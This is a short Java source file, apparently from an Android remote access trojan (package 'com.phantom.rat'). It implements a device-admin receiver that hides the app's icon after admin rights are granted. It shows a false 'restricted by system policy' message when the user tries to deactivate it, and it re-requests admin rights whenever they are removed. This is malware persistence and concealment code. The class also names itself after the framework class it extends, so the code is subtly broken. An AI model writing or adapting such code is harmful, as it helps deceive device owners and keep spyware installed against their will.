package com.phantom.rat;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class DeviceAdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) {
        if ("true".equals(FudUtils.config(context, "icon_hidden", "false"))) FudUtils.hideIcon(context);
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "Deactivation is restricted by system policy.";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        PermissionHelper.requestAdmin(context);
    }
}
